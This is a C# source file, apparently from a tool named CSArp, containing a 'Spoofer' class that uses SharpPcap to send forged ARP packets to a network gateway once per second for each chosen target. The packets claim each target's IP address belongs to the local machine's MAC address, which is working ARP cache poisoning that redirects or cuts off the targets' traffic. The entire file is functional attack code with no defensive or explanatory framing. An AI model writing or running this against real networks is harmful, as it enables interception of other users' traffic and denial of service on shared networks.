using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using CSArp.Model.Utilities;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace CSArp.Model
{
    public class Spoofer
    {
        private CancellationTokenSource _spoofingCts;
        private int _activeTargetCount;

        public void Start(
            IReadOnlyDictionary<IPAddress, PhysicalAddress> targets,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice networkAdapter)
        {
            StopAll();

            if (targets == null || targets.Count == 0)
            {
                DebugOutput.Print("Spoofing task skipped because there are no targets.");
                return;
            }

            _spoofingCts = new CancellationTokenSource();
            _activeTargetCount = targets.Count;

            if (!networkAdapter.Opened)
            {
                networkAdapter.Open();
            }

            DebugOutput.Print("Spoofing task started for " + _activeTargetCount + " target(s).");

            foreach (var target in targets)
            {
                var arpPacketForGatewayRequest = new ArpPacket(
                    ArpOperation.Request,
                    "00-00-00-00-00-00".Parse(),
                    gatewayIpAddress,
                    networkAdapter.MacAddress,
                    target.Key);

                var ethernetPacketForGatewayRequest = new EthernetPacket(networkAdapter.MacAddress, gatewayMacAddress, EthernetType.Arp)
                {
                    PayloadPacket = arpPacketForGatewayRequest
                };

                _ = Task.Run(
                    () => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token),
                    _spoofingCts.Token);
            }
        }

        public void StopAll()
        {
            if (_spoofingCts == null || _spoofingCts.IsCancellationRequested)
            {
                return;
            }

            _spoofingCts.Cancel();
            DebugOutput.Print("Spoofing task stopped for " + _activeTargetCount + " target(s).");
            _activeTargetCount = 0;
        }

        private static async Task SendSpoofingPacket(
            IPAddress ipAddress,
            PhysicalAddress physicalAddress,
            EthernetPacket ethernetPacket,
            LibPcapLiveDevice captureDevice,
            CancellationToken cancellationToken)
        {
            DebugOutput.Print("Spoofing target " + physicalAddress + " @ " + ipAddress);

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    captureDevice.SendPacket(ethernetPacket);
                    await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (PcapException ex)
            {
                DebugOutput.Print("PcapException @ Spoofer.SendSpoofingPacket() [" + ex.Message + "]");
            }

            DebugOutput.Print("Spoofing thread terminating for " + physicalAddress + " @ " + ipAddress);
        }
    }
}
